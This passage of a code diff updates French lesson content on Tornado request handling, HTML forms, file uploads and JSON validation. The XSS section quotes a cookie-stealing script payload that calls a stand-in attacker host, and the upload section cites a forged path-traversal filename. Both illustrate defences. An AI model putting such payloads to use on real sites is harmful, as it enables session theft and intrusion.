+            "cette problématique avec une pureté orientée objet remarquable : une classe socle **`BaseHandler(tornado.web.RequestHandler)`** "
+            "redéfinit les crochets internes du pipeline `RequestHandler._execute()` : **`set_default_headers()`**, "
+            "**`prepare()`** et **`on_finish()`**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Les 4 phases du Cycle de Vie d'un `RequestHandler` dans Tornado",
+                "heading": "1. Radiographie Interne de `RequestHandler._execute()` : Les Quatre Phases d'une Requête",
                 "body": (
-                    "Chaque requête HTTP qui franchit la porte de Tornado traverse séquentiellement quatre méthodes sur une nouvelle instance de `RequestHandler` :\n"
-                    "1. **`set_default_headers(self)`** : Appelée dès l'initialisation du handler pour poser les en-têtes de sécurité systématiques "
-                    "(`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, CORS).\n"
-                    "2. **`prepare(self)`** : S'exécute **avant** la méthode `get()`/`post()`. Idéale pour démarrer un chronomètre haute précision "
-                    "(`self.heure_debut = time.perf_counter()`), extraire ou générer `self.request_id`, ou bloquer une requête non autorisée "
-                    "(si `prepare(self)` appelle `self.finish(...)`, Tornado s'arrête immédiatement et n'appelle pas `get()` !).\n"
-                    "3. **Méthode HTTP (`def get(self)` / `def post(self)`)** : Exécute la logique métier et appelle `self.write({...})`.\n"
-                    "4. **`on_finish(self)`** : S'exécute **après** l'envoi complet de la réponse au client. Idéale pour écrire le journal "
-                    "d'audit structuré et libérer les ressources."
+                    "Comprendre dans quel ordre exact Tornado orchestre une instance de `RequestHandler` permet de placer "
+                    "chaque responsabilité transversale à l'endroit architecturalement juste. Dès l'`__init__()` du handler, "
+                    "Tornado appelle immédiatement **`set_default_headers(self)`** (et la rappellera automatiquement si "
+                    "`self.clear()` est invoqué lors d'un passage dans `write_error()`) : c'est donc l'unique emplacement "
+                    "fiable pour poser les en-têtes permanents (`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, "
+                    "en-têtes CORS) afin qu'ils survivent même en cas d'erreur `404` ou `500`.\n\n"
+                    "#### Le crochet `prepare(self)` (synchrone ou `async def`) et le court-circuit `self.finish()`\n\n"
+                    "Ensuite, la coroutine interne `_execute()` invoque **`prepare(self)`** (qui peut être déclarée `async def prepare(self):` "
+                    "pour interroger Redis ou une base asynchrone) juste avant d'appeler la méthode HTTP (`get`, `post`, `put`, "
+                    "`delete`). Détail mécanique décisif : dès le retour de `prepare()`, Tornado vérifie le drapeau interne "
+                    "`if not self._finished:` ! Par conséquent, si `prepare()` détecte un dépassement de quota ou un jeton "
+                    "invalide et appelle **`self.finish({...})`**, Tornado saute intégralement l'appel à `get()`/`post()` "
+                    "et passe directement au nettoyage final. Enfin, une fois les octets intégralement remis au tampon "
+                    "`IOStream`, Tornado exécute **`on_finish(self)`** pour émettre la trace d'audit et fermer les ressources.\n\n"
+                    "```python — Architecture canonique d'un BaseAuditHandler industriel dans Tornado\n"
+                    "class BaseAuditHandler(tornado.web.RequestHandler):\n"
+                    "    def set_default_headers(self) -> None:\n"
+                    "        self.set_header(\"X-Content-Type-Options\", \"nosniff\")\n\n"
+                    "    async def prepare(self) -> None:\n"
+                    "        self.t0 = time.perf_counter()\n"
+                    "        self.request_id = self.request.headers.get(\"X-Request-ID\") or f\"req-{uuid.uuid4().hex[:12]}\"\n"
+                    "        self.set_header(\"X-Request-ID\", self.request_id)\n\n"
+                    "    def on_finish(self) -> None:\n"
+                    "        duree_ms = (time.perf_counter() - self.t0) * 1000.0\n"
+                    "        print(f\"[AUDIT] id={self.request_id} status={self.get_status()} ms={duree_ms:.2f}\")\n"
+                    "```"
                 )
             },
             {
-                "heading": "2. Pourquoi stocker l'état de la requête sur `self` est 100 % isolé dans Tornado ?",
+                "heading": "2. Isolation Mémoire sur `self` face aux Conditions de Course (*Race Conditions*) sur l'`IOLoop`",
                 "body": (
-                    "Comment transmettre l'heure de début `heure_debut` mesurée dans `prepare(self)` à la méthode `get(self)` et à `on_finish(self)` ?\n"
-                    "- **Danger d'une variable globale** : Sur un serveur asynchrone où deux clients A et B appellent l'API en même temps, "
-                    "une variable globale `HEURE_DEBUT` serait écrasée par le client B !\n"
-                    "- **La solution `self` du `RequestHandler`** : Tornado instancie un **nouvel objet `RequestHandler` distinct pour chaque requête HTTP**. "
-                    "Tout attribut attaché à `self` (`self.request_id`, `self.heure_debut`, `self.current_user`) est donc strictement isolé "
-                    "pour cette requête unique et détruit automatiquement par le ramasse-miettes Python après `on_finish()`."
+                    "Sur une boucle d'événements `IOLoop`, deux requêtes asynchrones `A` et `B` entrelacent leur exécution à "
+                    "chaque point de suspension `await`. Si un développeur stockait `HEURE_DEBUT` ou `UTILISATEUR_COURANT` "
+                    "dans une variable globale du module Python, la requête `B` écraserait la valeur de la requête `A` pendant "
+                    "que `A` attend la réponse d'une requête réseau, provoquant une fuite catastrophique d'identité ou de "
+                    "métriques entre deux clients distincts !\n\n"
+                    "> [!IMPORTANT] Garantie d'isolation par instance de `RequestHandler`\n"
+                    "> Parce que `tornado.web.Application` alloue un **objet `RequestHandler` neuf par transaction HTTP**, "
+                    "l'espace d'attributs `self.__dict__` (`self.t0`, `self.request_id`, `self.current_user`) appartient "
+                    "exclusivement à cette requête unique du début de `prepare()` jusqu'à la sortie de `on_finish()`, "
+                    "sans nécessiter de `contextvars` complexes ni de verrous `threading.Lock`."
                 )
             },
             {
-                "heading": "3. L'importance industrielle du `X-Request-ID` (Correlation ID)",
+                "heading": "3. Horloge Monotone (`time.perf_counter`) et Traçabilité par `X-Request-ID`",
                 "body": (
-                    "Lorsqu'un client partenaire vous signale : *« J'ai reçu une erreur hier à 14h12 »*, chercher dans un "
-                    "fichier de log contenant 500 000 lignes est un cauchemar.\n"
-                    "Avec un identifiant unique **`X-Request-ID`** (par exemple `req-8f91a2b3c4d5` généré par `uuid.uuid4()`) "
-                    "renvoyé dans les en-têtes HTTP de chaque réponse ET inscrit dans chaque ligne de log d'audit, il suffit "
-                    "d'un simple `grep req-8f91a2b3c4d5 app.log` pour retrouver instantanément toute l'exécution correspondante."
+                    "Deux bonnes pratiques d'observabilité séparent un serveur amateur d'une infrastructure de production. "
+                    "Premièrement, on ne mesure jamais une latence HTTP avec l'horloge murale `time.time()` : lorsqu'un démon "
+                    "de synchronisation horaire NTP recale l'heure système de quelques dizaines de millisecondes en arrière, "
+                    "`time.time()` produit des durées négatives aberrantes ! L'horloge monotone matériellement garantie "
+                    "**`time.perf_counter()`** croît strictement à la nanoseconde près sans jamais subir les sauts calendaires.\n\n"
+                    "Deuxièmement, l'en-tête **`X-Request-ID`** (*Correlation ID*) relie l'expérience du client aux journaux "
+                    "serveur : si la passerelle Nginx en amont a déjà forgé un `X-Request-ID`, `prepare(self)` le conserve "
+                    "fidèlement (`self.request.headers.get('X-Request-ID')`) ; sinon, il en génère un via `uuid.uuid4()`, le "
+                    "retourne au client dans les en-têtes HTTP et l'imprime dans `on_finish()`. En cas d'incident signalé par "
+                    "un partenaire, une seule recherche sur cet identifiant reconstitue instantanément toute la chaîne d'appels."
                 )
             }
         ],
@@ -403,8 +500,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer l'injection automatique de `X-Request-ID` et `X-Response-Time-Ms`.",
-            "Observez comment l'en-tête personnalisé `X-Request-ID: trace-client-personnalise-777` envoyé par le client est conservé de bout en bout par `prepare(self)`."
+            "Exécutez `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer l'ordonnancement exact entre `prepare()`, la méthode HTTP et la trace `[AUDIT TORNADO]` émise par `on_finish()`.",
+            "Vérifiez comment l'en-tête entrant `X-Request-ID: trace-client-personnalise-777` fourni par l'appelant est préservé de bout en bout par `prepare(self)` au lieu d'être écrasé."
         ]
     },
 
@@ -413,52 +510,75 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l5": {
         "context": (
-            "Un service Web complet en entreprise ne se limite pas toujours à des échanges JSON entre machines : "
-            "très souvent, l'application Tornado doit aussi afficher un **portail d'administration**, une **page de connexion** "
-            "ou un **formulaire de saisie** pour des opérateurs humains.\n"
-            "Or, deux erreurs reviennent constamment chez les développeurs :\n"
-            "1. **Coder du HTML en dur dans les fichiers Python (`self.write(f\"<h1>{titre}</h1>\")`)**, ce qui mélange la logique "
-            "métier et la présentation tout en ouvrant une faille critique d'injection JavaScript (**XSS — Cross-Site Scripting**).\n"
-            "2. **Essayer de lire un formulaire HTML `<form method=\"POST\">` avec `json_decode(self.request.body)`**, qui lève "
-            "`JSONDecodeError` car un navigateur soumettant un formulaire HTML n'envoie **pas** du JSON, mais le format "
-            "`application/x-www-form-urlencoded` lu par **`self.get_body_argument(...)`** (ou `multipart/form-data` lu par **`self.request.files`**) !"
+            "En entreprise, une plateforme Tornado expose rarement uniquement des flux JSON machine-à-machine : elle "
+            "dessert très fréquemment en parallèle un **portail d'exploitation back-office**, un écran d'authentification "
+            "SSO ou des formulaires de téléversement documentaire destinés aux gestionnaires humains.\n\n"
+            "Sur ce terrain hybride, deux confusions techniques causent d'innombrables failles et pannes : assembler du "
+            "HTML par `f-strings` directement dans Python — ce qui ouvre instantanément la porte aux injections "
+            "JavaScript (**XSS — Cross-Site Scripting**) — et tenter d'analyser la soumission d'un `<form method=\"POST\">` "
+            "avec `json_decode(self.request.body)` alors que le navigateur expédie en réalité de "
+            "l'`application/x-www-form-urlencoded` (lu par **`self.get_body_argument()`**) ou du `multipart/form-data` "
+            "(lu par **`self.request.files`**)."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le Moteur `tornado.template` (`self.render`) et la protection automatique Anti-XSS",
+                "heading": "1. Compilation en Bytecode Python par `tornado.template` et Auto-Échappement Anti-XSS",
                 "body": (
-                    "Dans Tornado, on ne construit **jamais** une page HTML par concaténation de chaînes dans le fichier `.py`. "
-                    "Tous les fichiers HTML sont placés dans le dossier configuré via **`template_path`** et rendus par **`self.render(\"fichier.html\", ...)`** :\n"
-                    "- **Les expressions `{{ variable }}`** : Évaluent une expression Python (`{{ f[\"titre\"] }}`) et l'insèrent dans la page.\n"
-                    "- **Sécurité automatique contre les failles XSS (*Auto-Escaping*)** : Si un attaquant saisit `<script>alert('Piraté')</script>` "
-                    "comme titre de formation, **Tornado échappe automatiquement** les caractères spéciaux en `&lt;script&gt;...`, neutralisant l'attaque.\n"
-                    "- **Les structures de contrôle `{% ... %}` et fermeture universelle `{% end %}`** : Dans `tornado.template`, toutes les boucles "
-                    "(`{% for f in formations %}`) et toutes les conditions (`{% if erreurs %}`) se ferment avec le mot-clé unique **`{% end %}`**."
+                    "Contrairement aux moteurs de gabarits interprétés à chaque requête, **`tornado.template`** traduit chaque "
+                    "fichier `.html` situé dans `template_path` en une véritable fonction Python compilée en mémoire lors du "
+                    "premier appel à **`self.render(\"formations.html\", ...)`**, puis met ce bytecode en cache pour toutes "
+                    "les requêtes suivantes. Sa grammaire se distingue par une grande concision : les expressions `{{ f[\"titre\"] }}` "
+                    "évaluent directement du code Python, tandis que toutes les structures de contrôle (`{% for f in formations %}`, "
+                    "`{% if erreurs %}`) se referment uniformément avec le mot-clé unique **`{% end %}`**.\n\n"
+                    "#### Neutralisation automatique des injections XSS (*Cross-Site Scripting*)\n\n"
+                    "Par défaut dans Tornado (`autoescape=\"xhtml_escape\"`), toute valeur injectée via `{{ ... }}` traverse "
+                    "automatiquement `tornado.escape.xhtml_escape()` avant d'entrer dans le tampon HTML : si un attaquant "
+                    "soumet le titre `<script>fetch('https://pirate.tld?c='+document.cookie)</script>`, Tornado émet les "
+                    "entités inoffensives `&lt;script&gt;...&lt;/script&gt;` que le navigateur affiche comme un simple texte "
+                    "inerte sans jamais exécuter le code malveillant."
                 )
             },
             {
-                "heading": "2. Anatomie d'un Formulaire HTML (`<form method=\"POST\">`) : `self.get_body_argument` vs `json_decode`",
+                "heading": "2. Anatomie sur le Fil d'un Formulaire HTML : `self.get_body_argument` face à `json_decode`",
                 "body": (
-                    "Comprenons exactement ce qu'envoie un navigateur Web lorsqu'un utilisateur remplit un formulaire `<form method=\"POST\" action=\"/formations\">` :\n"
-                    "- Chaque champ `<input name=\"titre\">`, `<input name=\"duree_jours\">`, `<select name=\"salle\">` est identifié par son attribut **`name=\"...\"`**.\n"
-                    "- Au clic sur `<button type=\"submit\">`, le navigateur assemble une chaîne de paires `cle=valeur` séparées par `&` :\n"
-                    "  `titre=Architecture+API&duree_jours=5&salle=Salle+A`\n"
-                    "  accompagnée de l'en-tête HTTP : **`Content-Type: application/x-www-form-urlencoded`**.\n"
-                    "- Côté Tornado (dans `def post(self):`) :\n"
-                    "  - **`self.get_body_argument(\"titre\", \"\")`** extrait et décode proprement chaque champ du formulaire HTML.\n"
-                    "  - **`tornado.escape.json_decode(self.request.body)`** est réservé aux requêtes `Content-Type: application/json`."
+                    "Lorsqu'un utilisateur clique sur le bouton d'envoi d'un `<form method=\"POST\" action=\"/formations\">`, "
+                    "le navigateur collecte tous les champs munis d'un attribut **`name=\"...\"`** (et ignore totalement ceux "
+                    "qui ne possèdent qu'un `id` CSS !), les encode en paires `cle=valeur` jointes par `&` et expédie la trame "
+                    "sous l'en-tête **`Content-Type: application/x-www-form-urlencoded`**.\n\n"
+                    "```http — Trame exacte émise par un navigateur lors d'un <form method=\"POST\">\n"
+                    "POST /formations HTTP/1.1\r\n"
+                    "Host: localhost:8888\r\n"
+                    "Content-Type: application/x-www-form-urlencoded\r\n"
+                    "Content-Length: 48\r\n"
+                    "\r\n"
+                    "titre=Architecture+API&duree_jours=5&salle=Labo1\n"
+                    "```\n\n"
+                    "Lorsque `tornado.httputil.parse_body_arguments()` détecte cet en-tête (ou `multipart/form-data`), il "
+                    "alimente automatiquement `self.request.body_arguments`, que votre méthode `def post(self):` interroge "
+                    "proprement via **`self.get_body_argument(\"titre\", \"\")`**. En revanche, si l'en-tête entrant commence "
+                    "par `application/json`, `body_arguments` reste volontairement vide et c'est "
+                    "**`tornado.escape.json_decode(self.request.body)`** qui prend le relais."
                 )
             },
             {
-                "heading": "3. Envoi de Fichiers (`multipart/form-data` -> `self.request.files`) et Redirection `self.redirect()`",
+                "heading": "3. Téléversement Binaire (`multipart/form-data` -> `self.request.files`) et Patron `PRG` (`303`)",
                 "body": (
-                    "Deux mécanismes complémentaires sont indispensables pour maîtriser les formulaires en production :\n"
-                    "1. **Upload de fichiers (`enctype=\"multipart/form-data\"`)** : Dès qu'un formulaire contient `<input type=\"file\" name=\"document_pdf\">`, "
-                    "on ajoute `enctype=\"multipart/form-data\"` sur la balise `<form>`. Tornado place alors les fichiers binaires dans la liste "
-                    "**`self.request.files.get(\"document_pdf\", [])`**, où chaque élément est un dictionnaire `{\"filename\": ..., \"body\": bytes, \"content_type\": ...}`. "
-                    "Il est obligatoire d'assainir `filename` (`os.path.basename` + regex) pour bloquer toute attaque *Path Traversal* (`../../etc/passwd`).\n"
-                    "2. **Le Patron `PRG` (*Post / Redirect / Get*)** : Après un `POST` réussi depuis un navigateur, appeler `self.redirect(\"/formations\")` "
-                    "(code HTTP `302`) évite que l'utilisateur ne soumette le formulaire une seconde fois en appuyant sur `F5`."
+                    "L'ajout d'un champ `<input type=\"file\" name=\"document_pdf\">` oblige à déclarer "
+                    "`enctype=\"multipart/form-data\"` sur la balise `<form>`. Le navigateur segmente alors le corps HTTP "
+                    "autour d'une frontière unique (`boundary=----WebKitFormBoundary...`). Côté Tornado, chaque fichier reçu "
+                    "est rangé dans **`self.request.files.get(\"document_pdf\", [])`** sous la forme d'une instance "
+                    "`tornado.httputil.HTTPFile` (accessible comme un dictionnaire contenant `\"filename\"`, les octets bruts "
+                    "`\"body\"` et `\"content_type\"`).\n\n"
+                    "> [!WARNING] Assainissement obligatoire de `filename` contre le *Path Traversal*\n"
+                    "> Le champ `filename` provient directement de la trame client et peut être forgé avec `curl` pour valoir "
+                    "`\"../../../../etc/cron.d/backdoor\"` ! Extrayez toujours `os.path.basename(fichier[\"filename\"])`, "
+                    "filtrez les caractères par expression régulière stricte (ou renommez le fichier avec un `uuid4().hex`), "
+                    "vérifiez l'extension et contrôlez les premiers octets magiques (`b\"%PDF-\"` pour un PDF) avant d'écrire "
+                    "sur disque.\n\n"
+                    "Enfin, après le traitement réussi d'un formulaire HTML en `POST`, ne terminez pas par un simple "
+                    "`self.render()` en code `200`, sinon un rafraîchissement clavier `F5` de l'opérateur soumettra une "
+                    "seconde fois le formulaire en créant un doublon : appliquez le patron industriel **PRG (*Post / Redirect "
+                    "/ Get*)** en appelant `self.redirect(\"/formations\", status=303)` (`303 See Other`)."
                 )
             }
         ],
@@ -506,8 +626,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja` (bouton ci-dessous ou dans la barre d'outils), soumettez une nouvelle formation via le formulaire HTML et observez la trame `application/x-www-form-urlencoded` reçue.",
-            "Testez également un envoi invalide (durée négative ou titre d'une seule lettre) pour observer comment la boucle `{% for err in erreurs %} ... {% end %}` affiche les erreurs côté serveur."
+            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja`, soumettez une nouvelle formation via le formulaire HTML et observez le décodage `application/x-www-form-urlencoded` opéré côté serveur.",
+            "Soumettez volontairement une durée négative et un intitulé d'un seul caractère afin de vérifier comment la boucle `{% for err in erreurs %} ... {% end %}` restitue les anomalies sans planter."
         ]
     },
 
@@ -516,47 +636,82 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l1": {
         "context": (
-            "Jusqu'ici, notre serveur répondait principalement à des requêtes de consultation (`GET`). Dès que l'on "
-            "autorise les clients à **créer (`POST`)**, **modifier (`PUT`/`PATCH`)** et **supprimer (`DELETE`)** des "
-            "données (les 4 opérations **CRUD**), une règle cardinale de sécurité entre en jeu : **Ne jamais faire "
-            "confiance aux données envoyées par le client (*Never Trust User Input*)**.\n"
-            "Un client peut envoyer un JSON cassé, oublier un champ obligatoire, envoyer un texte à la place d'un "
-            "nombre ou tenter de créer une formation de `-15` jours. Ce chapitre enseigne comment valider rigoureusement "
-            "les payloads entrants dans Tornado et structurer les réponses d'erreur selon la norme internationale **RFC 7807 (Problem Details)**."
+            "Tant qu'un serveur se contente d'exposer des routes de lecture `GET`, son état interne demeure préservé. "
+            "Mais dès que vous ouvrez les opérations complètes du cycle **CRUD** — créer (`POST`), remplacer (`PUT`), "
+            "modifier partiellement (`PATCH`) et supprimer (`DELETE`) — l'axiome fondamental de la sécurité applicative "
+            "s'applique sans compromis : **ne jamais accorder la moindre confiance aux octets reçus du réseau "
+            "(*Never Trust User Input*)**.\n\n"
+            "Contrairement à FastAPI qui délègue ce filtrage à Pydantic par annotations de signature, Tornado laisse à "
+            "l'architecte la responsabilité explicite de décoder `self.request.body` et de qualifier chaque violation. "
+            "Ce chapitre enseigne comment bâtir un pipeline de validation déterministe distinguant **`400 Bad Request`** "
+            "de **`422 Unprocessable Content`** et formatant chaque diagnostic selon la norme **IETF RFC 7807 / RFC 9457 "
+            "(*Problem Details for HTTP APIs*)**."
         ),
         "deep_sections": [
             {
-                "heading": "1. Lecture sécurisée du Corps JSON avec `tornado.escape.json_decode(self.request.body)`",
+                "heading": "1. Désérialisation Blindée de `self.request.body` dans un `RequestHandler` Tornado",
                 "body": (
-                    "Dans un `RequestHandler` Tornado, les octets bruts du corps de la requête sont stockés dans `self.request.body`. "
-                    "Lorsque vous appelez `tornado.escape.json_decode(self.request.body)` sur un JSON mal formé (par exemple une virgule en trop), "
-                    "Python lève `json.JSONDecodeError`.\n"
-                    "En encapsulant cet appel dans une méthode helper `lire_json()` avec `try / except (json.JSONDecodeError, TypeError, ValueError):` :\n"
-                    "- Si le corps est vide ou syntaxiquement invalide, la fonction ne plante pas et renvoie `None`.\n"
-                    "- Vous pouvez alors tester `if not isinstance(corps, dict):` et renvoyer vous-même une réponse JSON "
-                    "explicite avec `self.set_status(400)` (**`400 Bad Request`**)."
+                    "Dans un `RequestHandler`, le tampon brut `self.request.body` est toujours un objet `bytes` (éventuellement "
+                    "vide `b\"\"` si le client n'a transmis aucun corps). Invoquer directement `tornado.escape.json_decode(self.request.body)` "
+                    "sans protection expose la route à trois familles d'exceptions : `json.JSONDecodeError` (sous-classe de "
+                    "`ValueError`) si le JSON comporte une virgule pendante ou est vide, `UnicodeDecodeError` si le flux "
+                    "contient des octets non UTF-8 invalides, et enfin le cas subtil où le client envoie un littéral JSON "
+                    "valide mais non objet tel que `\"bonjour\"`, `42` ou `[1, 2, 3]` — ce qui provoquerait une `AttributeError` "
+                    "dès le premier appel ultérieur à `corps.get(\"titre\")` !\n\n"
+                    "```python — Helper défensif d'extraction d'objet JSON dans BaseJSONHandler\n"
+                    "def lire_objet_json(self) -> dict | None:\n"
+                    "    if not self.request.body:\n"
+                    "        return None\n"
+                    "    try:\n"
+                    "        donnees = tornado.escape.json_decode(self.request.body)\n"
+                    "    except (ValueError, UnicodeDecodeError):\n"
+                    "        return None\n"
+                    "    return donnees if isinstance(donnees, dict) else None\n"
+                    "```\n\n"
+                    "Lorsque `lire_objet_json()` retourne `None`, le contrôleur coupe immédiatement l'exécution avec "
+                    "`self.set_status(400)` (**`400 Bad Request`**) car la syntaxe même du conteneur JSON est inexploitable."
                 )
             },
             {
-                "heading": "2. Pourquoi collecter TOUTES les erreurs de validation plutôt que de s'arrêter à la première ?",
+                "heading": "2. Collecte Exhaustive des Erreurs Métier vs Arrêt au Premier Champ (`Fail-Fast` vs `Collect-All`)",
                 "body": (
-                    "Imaginez un formulaire de création comportant 5 champs dont 3 sont erronés. Si votre API s'arrête dès "
-                    "le 1er champ invalide, l'utilisateur corrige le 1er champ, renvoie la requête, découvre que le 2ème est "
-                    "faux, corrige le 2ème, renvoie la requête et découvre que le 3ème est faux !\n"
-                    "En accumulant toutes les anomalies dans une liste **`erreurs = []`** (comme dans la fonction "
-                    "`valider_payload_formation` de notre script), votre API renvoie en un seul appel la liste exhaustive "
-                    "des champs en erreur avec le code **`422 Unprocessable Entity`**."
+                    "Considérez un écran d'inscription mobile comportant huit champs de saisie dont trois violent vos règles "
+                    "métier. Si votre validateur Python s'interrompt dès la première anomalie rencontrée, l'utilisateur est "
+                    "contraint de soumettre trois fois le formulaire en corrigeant une erreur après l'autre — une friction "
+                    "ergonomique rédhibitoire autant pour un humain que pour un intégrateur B2B.\n\n"
+                    "Une fonction pure `valider_payload_formation(corps: dict) -> dict[str, str]` inspecte donc séquentiellement "
+                    "**tous les attributs** du dictionnaire et accumule chaque violation dans un conteneur `erreurs` indexé "
+                    "par nom de champ. Ce n'est qu'à l'issue de l'inspection complète que le `RequestHandler` teste `if erreurs:`, "
+                    "positionne **`self.set_status(422)`** et restitue en un unique aller-retour la cartographie complète des "
+                    "champs à rectifier."
                 )
             },
             {
-                "heading": "3. Le Standard International RFC 7807 (`Problem Details for HTTP APIs`)",
+                "heading": "3. La Norme Internationale IETF RFC 7807 / RFC 9457 (`application/problem+json`)",
                 "body": (
-                    "Pour éviter que chaque équipe n'invente son propre format d'erreur (`{\"err\": ...}`, `{\"message\": ...}`, "
-                    "`{\"fault\": ...}`), l'IETF a publié la norme **RFC 7807 / RFC 9457**. Une erreur normalisée contient :\n"
-                    "- `type` : URI identifiant la catégorie d'erreur (ex: `https://api.isgp.dz/erreurs/validation`).\n"
-                    "- `title` : Résumé lisible du problème.\n"
-                    "- `status` : Répétition du code HTTP numérique (`422`).\n"
-                    "- `errors` : Liste détaillée des champs invalides (`[{\"champ\": \"duree_jours\", \"message\": \"...\"}]`)."
+                    "Pendant longtemps, chaque équipe backend inventait son propre dialecte d'erreur incompatible (`{\"err\": ...}`, "
+                    "`{\"error_msg\": ...}`, `{\"fault\": {\"code\": ...}}`), obligeant les clients à écrire un parseur "
+                    "d'erreur sur mesure par fournisseur. Pour unifier l'écosystème Web mondial, l'IETF a publié la **RFC 7807** "
+                    "(consolidée en 2023 par la **RFC 9457**), qui standardise l'en-tête **`Content-Type: application/problem+json`**.\n\n"
+                    "> « Ce document définit un format de détail de problème permettant d'embarquer des informations lisibles "
+                    "par machine dans une réponse d'erreur HTTP, évitant ainsi d'inventer de nouveaux formats de réponse "
+                    "d'erreur pour les APIs HTTP. » — Mark Nottingham & Erik Wilde, IETF RFC 7807 (Abstract)\n\n"
+                    "```json — Enveloppe normalisée RFC 7807 émise avec self.set_status(422)\n"
+                    "{\n"
+                    "  \"type\": \"https://api.isgp.dz/erreurs/validation-metier\",\n"
+                    "  \"title\": \"Échec de validation des règles métier\",\n"
+                    "  \"status\": 422,\n"
+                    "  \"detail\": \"Deux attributs du payload violent les contraintes du catalogue.\",\n"
+                    "  \"instance\": \"/api/v1/formations\",\n"
+                    "  \"errors\": {\n"
+                    "    \"titre\": \"Le titre doit comporter au moins 3 caractères.\",\n"
+                    "    \"duree_jours\": \"La durée doit être comprise entre 1 et 30 jours.\"\n"
+                    "  }\n"
+                    "}\n"
+                    "```\n\n"
+                    "En cas de validation intégralement réussie sur `POST`, le contrôleur insère la ressource, invoque "
+                    "**`self.set_status(201)`**, renseigne l'en-tête normatif **`self.set_header(\"Location\", f\"/api/v1/formations/{new_id}\")`** "
+                    "indiquant l'URI canonique de l'entité fraîchement créée, puis sérialise sa représentation complète."
                 )
             }
         ],
@@ -595,8 +750,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le script dans l'atelier ci-dessus pour observer la réponse RFC 7807 complète lorsqu'un client envoie un titre trop court et une durée négative.",
-            "Cliquez sur « Tester POST /api/sandbox/formations » pour créer une nouvelle formation dans la base du laboratoire."
+            "Exécutez `day_3/01_api_crud_memoire.py` dans l'atelier ci-dessus pour observer la structure exacte du document `application/problem+json` (RFC 7807) généré lorsqu'un titre trop court et une durée négative sont soumis simultanément.",
+            "Actionnez le bouton « Tester la création : POST /api/sandbox/formations » afin de persister une nouvelle entrée et d'inspecter le code `201 Created` retourné."
         ]
     },
 
@@ -605,47 +760,74 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d3-l2": {
         "context": (
-            "Deux questions d'architecture reviennent systématiquement lors de la conception d'APIs professionnelles "
-            "(notamment dans la finance, le e-commerce et l'administration) :\n"
-            "1. **Quelle est la différence exacte entre `PUT` (`def put`) et `PATCH` (`def patch`) pour modifier une ressource existante ?**\n"
-            "2. **Comment empêcher qu'un client qui clique deux fois sur « Payer » (ou dont le réseau 4G coupe et "
-            "réessaie automatiquement son `POST`) ne soit débité deux fois ?**\n"
-            "Ce chapitre apporte la réponse complète et l'implémentation de référence en Python/Tornado."
+            "Dans la conception d'APIs critiques — paiement électronique, réservation de places ou gestion administrative — "
+            "deux décisions d'architecture séparent immédiatement une implémentation rigoureuse d'un système fragile : "
+            "maîtriser la frontière sémantique exacte entre **`def put(self, id)`** et **`def patch(self, id)`**, et "
+            "garantir qu'un client dont la connexion mobile s'interrompt en plein milieu d'un **`POST`** puisse rejouer "
+            "sa requête sans jamais provoquer de double facturation.\n\n"
+            "Ce chapitre formalise les contrats RFC 9110 et RFC 5789 au sein d'un `RequestHandler` Tornado et implémente "
+            "le mécanisme industriel de déduplication par en-tête **`Idempotency-Key`** popularisé par Stripe et Adyen."
         ),
         "deep_sections": [
             {
-                "heading": "1. Remplacement Intégral (`def put`) vs Modification Partielle (`def patch` — RFC 5789)",
+                "heading": "1. Remplacement Intégral (`def put` — RFC 9110) face à Mutation Partielle (`def patch` — RFC 5789)",
                 "body": (
-                    "Supposons que la formation `#1` contienne : `{\"id\": 1, \"titre\": \"Tornado\", \"duree_jours\": 5, \"salle\": \"Labo 1\"}`.\n"
-                    "- **Avec `PUT /api/v1/formations/1` (`def put(self, formation_id)`)** : La sémantique officielle de `PUT` est « **Remplacer l'intégralité "
-                    "de la fiche #1 par le document fourni** ». Le client doit donc envoyer **tous les champs obligatoires** "
-                    "(`titre`, `duree_jours`, `salle`). Tout champ non fourni est réinitialisé à sa valeur par défaut.\n"
-                    "- **Avec `PATCH /api/v1/formations/1` (`def patch(self, formation_id)`)** : La sémantique de `PATCH` est « **Appliquer une modification "
-                    "partielle** ». Si vous voulez uniquement déménager la formation dans la `\"Salle B\"`, vous envoyez "
-                    "uniquement `{\"salle\": \"Salle B\"}` : le serveur conserve le `titre` et la `duree_jours` intacts !"
+                    "Considérons l'enregistrement `#1` stocké sur le serveur : "
+                    "`{\"id\": 1, \"titre\": \"Tornado Async\", \"duree_jours\": 5, \"salle\": \"Labo 1\"}`. Dans la classe "
+                    "`FormationItemHandler`, les méthodes `put` et `patch` opèrent sur la même URI `/api/v1/formations/1`, "
+                    "mais obéissent à deux contrats opposés. La sémantique normative de **`PUT`** exige le **remplacement "
+                    "complet** de l'état de la ressource cible par la représentation fournie : le client doit transmettre "
+                    "l'intégralité des champs obligatoires (`titre`, `duree_jours`, `salle`), et tout attribut optionnel "
+                    "absent du payload est réinitialisé.\n\n"
+                    "À l'inverse, introduite par l'**IETF RFC 5789**, la méthode **`PATCH`** transporte un **ensemble "
+                    "partiel d'instructions de modification** (*JSON Merge Patch* RFC 7396) : si le gestionnaire souhaite "
+                    "uniquement transférer la session vers `\"Salle Conférence\"` sans connaître ni réécrire sa durée, il "
+                    "envoie le seul dictionnaire `{\"salle\": \"Salle Conférence\"}`. Votre méthode `def patch(self, id_str):` "
+                    "ne met à jour que les clés explicitement présentes dans `corps` tout en conservant `titre` et "
+                    "`duree_jours` strictement intacts."
                 )
             },
             {
-                "heading": "2. Le problème critique de la non-idempotence de `POST` sur les réseaux instables",
+                "heading": "2. Le Scénario des « Deux Généraux » : Pourquoi `POST` Crée des Doublons sur Réseau Instable",
                 "body": (
-                    "Imaginez le scénario réel suivant :\n"
